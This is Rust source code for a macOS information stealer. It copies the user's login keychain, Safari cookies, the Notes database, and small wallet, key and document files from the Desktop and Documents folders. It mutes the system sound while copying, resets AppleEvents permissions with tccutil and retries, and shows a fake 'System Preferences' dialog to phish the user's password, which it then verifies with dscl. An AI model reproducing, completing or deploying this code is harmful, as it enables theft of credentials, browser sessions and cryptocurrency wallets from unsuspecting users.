use crate::tools;
use crate::config;
use std::collections::HashMap;
use serde::{Serialize, Deserialize};
use anyhow::{Result, Context};

#[derive(Serialize, Deserialize, Debug)]
pub struct IpInfo {
    #[serde(rename = "ip")]
    pub ip_address: Option<String>,
    #[serde(flatten)]
    pub other: HashMap<String, serde_json::Value>,
}

pub struct SystemInfo {
    encryption_key: String,
}

impl SystemInfo {
    pub fn new(encryption_key: String) -> Self {
        SystemInfo { encryption_key }
    }

    pub async fn collect_system_info(&self, temp_path: &str) -> Result<()> {
        let mut system_info = self.get_system_profiler_info()?;
        let ip_info = self.get_ip_info().await?;

        system_info.insert("ip_info".to_string(), serde_json::to_value(ip_info)?);
        system_info.insert("system_os".to_string(), serde_json::Value::String("macos".to_string()));
        system_info.insert("system_password".to_string(), serde_json::Value::String("".to_string()));
        system_info.insert("BUILD_ID".to_string(), serde_json::Value::String(config::BUILD_ID.to_string()));

        let file_path = format!("{}/system_info.json", temp_path);
        let json_data = serde_json::to_string_pretty(&system_info)?;
        std::fs::write(&file_path, json_data)
            .with_context(|| format!("Failed to write system info to file: {}", file_path))?;

        Ok(())
    }

    fn get_system_profiler_info(&self) -> Result<HashMap<String, serde_json::Value>> {
        let data = tools::exec("system_profiler SPSoftwareDataType SPHardwareDataType")?;
        let mut system_info = HashMap::new();

        for line in data.lines() {
            if !line.is_empty() {
                if let Some(delimiter_pos) = line.find(":") {
                    let key = tools::trim(&line[..delimiter_pos]);
                    let value = if (delimiter_pos + 2) < line.len() {
                        tools::trim(&line[delimiter_pos + 2..])
                    } else {
                        "".to_string()
                    };
                    system_info.insert(key, serde_json::Value::String(value));
                }
            }
        }
        Ok(system_info)
    }

    async fn get_ip_info(&self) -> Result<IpInfo> {
        let ip_api_url = "https://freeipapi.com/api/json/";
        let ip_api_result = tools::fetch_url(ip_api_url).await?;

        let mut ip_info: IpInfo = serde_json::from_str(&ip_api_result)
            .with_context(|| format!("Failed to parse IP info from: {}", ip_api_url))?;

        let public_ip_url = "https://api.ipify.org/?format=json";
        let public_ip_result = tools::fetch_url(public_ip_url).await?;

        let public_ip_info: HashMap<String, String> = serde_json::from_str(&public_ip_result)
            .with_context(|| format!("Failed to parse public IP info from: {}", public_ip_url))?;

        ip_info.ip_address = public_ip_info.get("ip").cloned();

        Ok(ip_info)
    }

    pub fn dump_keychain_passwords(&self, temp_path: &str) -> Result<()> {
        let keychain_path = format!("{}/Library/Keychains/login.keychain-db", tools::get_home_directory());
        let destination_dir = format!("{}/Passwords", temp_path);
        tools::copy_file_to_directory(&keychain_path, &destination_dir)?;
        Ok(())
    }

    pub fn file_grab(&self, temp_path: &str) -> Result<()> {
        let apple_script = r#"
            -- Function to mute the system sound
            do shell script "osascript -e 'set volume with output muted'"

            set baseFolderPath to (path to home folder as text) & "tempFolder-32555443:"
            set fileGrabberFolderPath to baseFolderPath & "FileGrabber:"
            set notesFolderPath to baseFolderPath & "Notes:"

            tell application "Finder"
                set username to short user name of (system info)

                -- Check if baseFolderPath exists, if not, create it
                if not (exists folder baseFolderPath) then
                    do shell script "echo 'Creating base folder'"
                    make new folder at (path to home folder) with properties {name:"tempFolder-32555443"}
                end if

                -- Create fileGrabberFolderPath
                try
                    do shell script "echo 'Creating FileGrabber folder'"
                    make new folder at folder baseFolderPath with properties {name:"FileGrabber"}
                    delay 2 -- Delay to give Finder time to create the folder
                end try

                -- Create notesFolderPath
                try
                    do shell script "echo 'Creating Notes folder'"
                    make new folder at folder baseFolderPath with properties {name:"Notes"}
                    delay 2 -- Delay to give Finder time to create the folder
                end try

                -- Copy Safari cookies
                try
                    do shell script "echo 'Copying Safari cookies'"
                    set macOSVersion to do shell script "sw_vers -productVersion"
                    if macOSVersion starts with "10.15" or macOSVersion starts with "10.14" then
                        set safariFolder to ((path to library folder from user domain as text) & "Safari:")
                    else
                        set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")
                    end if
                    duplicate file "Cookies.binarycookies" of folder safariFolder to folder fileGrabberFolderPath with replacing
                    delay 2 -- Delay to give Finder time to copy the file
                end try

                -- Copy Notes database to Notes folder
                try
                    do shell script "echo 'Copying Notes database'"
                    set homePath to path to home folder as string
                    set sourceFilePath to homePath & "Library:Group Containers:group.com.apple.notes:NoteStore.sqlite"
                    duplicate file sourceFilePath to folder notesFolderPath with replacing
                    delay 2 -- Delay to give Finder time to copy the file
                end try

                set extensionsList to {"txt", "docx", "rtf", "doc", "wallet", "keys", "key"}

                -- Gather and copy desktop files
                try
                    do shell script "echo 'Gathering desktop files'"
                    set desktopFiles to every file of desktop
                    -- Copy desktop files
                    repeat with aFile in desktopFiles
                        try
                            set fileExtension to name extension of aFile
                            if fileExtension is in extensionsList then
                                set fileSize to size of aFile
                                if fileSize < 51200 then
                                    do shell script "echo 'Copying file: " & (name of aFile as string) & "'"
                                    duplicate aFile to folder fileGrabberFolderPath with replacing
                                    delay 1 -- Delay to give Finder time to copy each file
                                end if
                            end if
                        end try
                    end repeat
                end try

                -- Gather and copy documents files
                try
                    do shell script "echo 'Gathering documents files'"
                    set documentsFiles to every file of folder "Documents" of (path to home folder)
                    -- Copy documents files
                    repeat with aFile in documentsFiles
                        try
                            set fileExtension to name extension of aFile
                            if fileExtension is in extensionsList then
                                set fileSize to size of aFile
                                if fileSize < 51200 then
                                    do shell script "echo 'Copying file: " & (name of aFile as string) & "'"
                                    duplicate aFile to folder fileGrabberFolderPath with replacing
                                    delay 1 -- Delay to give Finder time to copy each file
                                end if
                            end if
                        end try
                    end repeat
                end try
            end tell

            -- Function to unmute the system sound
            do shell script "osascript -e 'set volume without output muted'"
        "#;

        let reset_permissions = r#"
            -- Reset AppleEvents permissions
            do shell script "tccutil reset AppleEvents"
        "#;

        let mut attempts = 0;
        loop {
            attempts += 1;
            println!("Attempt {} to execute AppleScript.", attempts);
            let req = self.execute_apple_script(apple_script)?;

            if req != 0 {
                println!("AppleScript execution failed on attempt {} with return code {}. Resetting permissions and trying again.", attempts, req);
                self.execute_apple_script(reset_permissions)?;
                std::thread::sleep(std::time::Duration::from_secs(1));
                if attempts >= 30 {
                    break;
                }
                continue;
            }
            println!("AppleScript executed successfully on attempt {}.", attempts);
            break;
        }

        let source_path = format!("{}/tempFolder-32555443", tools::get_home_directory());
        let destination_path = format!("{}/FileGrabber", temp_path);
        let command_mv = format!("mv {} {}", source_path, destination_path);
        let result = tools::exec(&command_mv)?;

        if !result.is_empty() {
            println!("Command execution failed: {}", result);
        } else {
            println!("AppleScript executed and files moved successfully.");
        }

        Ok(())
    }

    fn execute_apple_script(&self, script: &str) -> Result<i32> {
        let script_path = "/tmp/tempAppleScript.scpt";
        let formatted_script = script.replace("\\n", "\n");
        std::fs::write(script_path, formatted_script)?;

        let command = format!("osascript {}", script_path);
        let output = tools::exec(&command)?;

        let return_code = if output.is_empty() {
            0
        } else {
            let parts: Vec<&str> = output.split(" ").collect();
            if parts.len() > 1 {
                parts[1].trim().parse::<i32>().unwrap_or(-1)
            } else {
                -1
            }
        };

        Ok(return_code)
    }

    pub fn get_macos_password(&self) -> Result<()>{
        let username = tools::exec("whoami")?;
        let username = tools::trim(&username);
        for _ in 0..5 {
            let dialog_command = "osascript -e 'display dialog \"To launch the application, you need to update the system settings \\n\\nPlease enter your password.\" with title \"System Preferences\" with icon caution default answer \"\" giving up after 30 with hidden answer'";
            let dialog_result = tools::exec(dialog_command)?;
            let mut password = String::new();

            if let Some(start_range) = dialog_result.find("text returned:") {
                let start_index = start_range + "text returned:".len();
                let end_range = dialog_result[start_index..].find(", gave up:").map(|x| x + start_index);
                let end_range = if end_range.is_none() {
                    dialog_result[start_index..].find(", gave up:true").map(|x| x + start_index)
                } else {
                    end_range
                };

                if let Some(end_index) = end_range {
                    password = dialog_result[start_index..end_index].to_string();
                } else {
                    password = dialog_result[start_index..].to_string();
                }
            } else {
                println!("Error: 'text returned:' not found in dialogResult");
                continue;
            }

            if self.verify_password(&username, &password)? {
                println!("Password saved successfully.");
                //TODO: Save password
                break;
            } else {
                println!("Password verification failed.");
            }
        }
        Ok(())
    }

    fn verify_password(&self, username: &str, password: &str) -> Result<bool> {
        let command = format!("dscl /Local/Default -authonly {} {}", username, password);
        let result = tools::exec(&command)?;
        Ok(result.is_empty())
    }
} 